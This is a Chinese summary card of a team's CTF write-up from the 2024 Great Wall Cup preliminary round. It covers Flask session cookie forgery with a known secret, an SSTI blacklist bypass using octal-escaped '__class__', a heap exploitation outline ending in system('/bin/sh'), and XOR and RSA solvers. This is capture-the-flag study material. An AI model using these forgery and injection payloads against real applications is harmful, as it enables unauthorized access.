---
title: 第四届"长城杯"网络安全大赛暨京津冀网络安全技能竞赛(初赛) by Mini-Venom
contest: 长城杯
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [Web-Flask-session伪造,SSTI-8进制Unicode转义,Re-XOR加密,流密码XOR-反向,Crypto-RSA-二元二次方程爆破,Pwn,OAA,Flask-session-sold]
attack_chain: MISC: oa.access.log awk uniq -c sort -nr 找最频繁IP|MD5爆破: md5(chr(k)) hex 字典 32-127爆破日志中MD5|Flask session伪造: decode+encode signed 'a123456'+伪造admin identity/username/ sold=600或inventory='{{7*7}}'|SSTI8进制: ''['\\137\\137\\143\\154\\141\\163\\163\\137\\137']...8进制转义|逆向: argv[1][i] ^= argv[1][i+1-42*(v4/0x2A)] 循环加密|流密码反向: encoded[]从后向前 ^= encoded[xorIndices[currentIndex]]|RSA-二次方程: 已知a,b,n,c,for k1 in 0..999: A=a, B=b+k2+k1*a, C=k1*(b+k2)-n, Ax^2+Bx+C=0 求根n%p1==0|Pwn
key_payload: cat oa.access.log|awk '{print $1}'|uniq -c|sort -nr|md5(chr(k) for k in 32..127)|python .flask_session_cookie_manager3.py decode -s 'a123456' -c 'COOKIE'|encode -t "{'csrf_token': '94c60c...', 'identity':'admin', 'username': 'admin', '__init__':{'__globals__':{'inventory':'{{7*7}}'}}}"|{{''['\\137\\137\\143\\154\\141\\163\\163\\137\\137']...]|v3->m128i_i8[i] ^= v3->m128i_u8[i+1-42*(v4/0x2A)]; ++v4|for k1 in range(1000): for k2 in range(1000): A=a; B=b+k2+k1*a; C=k1*(b+k2)-n; delta = nthroot_mod(B^2-4*A*C, 2, p); p1=(-B+delta)*inverse(2*A,p)%p + k1; if n%p1==0: ...|OAA + House of ...
one_liner: 第四届长城杯京津冀初赛(2024-09)ChaMd5 Mini-Venom:oa.access.log awk统计最频繁IP+md5爆破日志中MD5→flag+Flask session伪造(sold/inventory+SSTI 8进制Unicode转义)+流密码XOR反向+RSA二元二次方程(k1,k2)爆破+Pwn House of X
lesson: 1) Flask session:session_data + sold(库存)/inventory(SSTI触发)字段; 2) SSTI 8进制转义:'\\137\\143\\154\\141\\163\\163'对应'__class__'绕黑名单; 3) argv[1][i] ^= argv[1][i+1-42*(v4/0x2A)]:流密码异或下一字节(自步进)逆需从后向前; 4) RSA二元二次方程爆破:已知a,b,c,A=a, B=b+k2+k1*a, C=k1*(b+k2)-n,求解n%p1==0; 5) 主流密码逆:encoded[]从后向前异或xorIndices[currentIndex]
quality: medium
---

## 备注

原文(https://www.ctfiot.com/204445.html)2024年9月第四届长城杯初赛,ChaMd5 Mini-Venom WP。开头招新广告。

### 题目详情

**MISC**
- `cat oa.access.log|awk '{print $1}'|uniq -c|sort -nr` 找最频繁IP
- MD5爆破:日志中MD5对应chr(32..127)单字符

**WEB**
- Flask session解码: `python .flask_session_cookie_manager3.py decode -s 'a123456' -c 'COOKIE'`
  → `{'csrf_token': 'c39fc0885d0aa72bef356e9dda9d25753343a4c7', 'identity':'guest', 'username': 'admin'}`
- Flask session伪造: `encode -t "{'csrf_token': '94c60c3656b0b0e1f9875b5007a36bdb8c99a4c2', 'identity':'admin', 'username': 'admin', '__init__':{'__globals__':{'sold':600}}}"`
- SSTI触发:inventory='{{7*7}}' 或 `\137\137\143\154\141\163\163\137\137`=8进制'__class__'

**逆向**
- 加密:argv[1][i] ^= argv[1][i+1-42*(v4/0x2A)]
- 逆:encoded[]从后向前
```cpp
int currentIndex = encoded.size() - 1;
for (int i = encoded.size() - 1; i >= 0; i--) {
    encoded[i] ^= encoded[xorIndices[currentIndex]];
    currentIndex--;
}
```

**Crypto-RSA二次方程**
```python
p, a, b, n, c 已知
for k1 in range(1000):
    for k2 in range(1000):
        A = a
        B = b + k2 + k1 * a
        C = k1 * (b + k2) - n
        # Ax^2 + Bx + C = 0
        delta = nthroot_mod(B**2 - 4 * A * C, 2, p)
        p1 = (-B + delta) * inverse(2 * A, p) % p + k1
        p2 = (-B - delta) * inverse(2 * A, p) % p + k1
        if n % p1 == 0:
            p = p1
            q = n // p
            d = inverse(e, (p-1)*(q-1))
            print(long_to_bytes(pow(c, d, n)))
```

**Pwn**
- 经典菜单题:show/free/add/edit
- 0x460堆块释放泄libc_base
- tcache满转fastbin
- free_hook覆盖
- system('/bin/sh')

## 评级

- **quality: medium** — 4-5题,exp较完整但部分题不完整(Web Flask伪造+sold/inventory+SSTI 8进制转义是亮点)
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:Flask session伪造+SSTI 8进制Unicode转义是CTF高阶套路
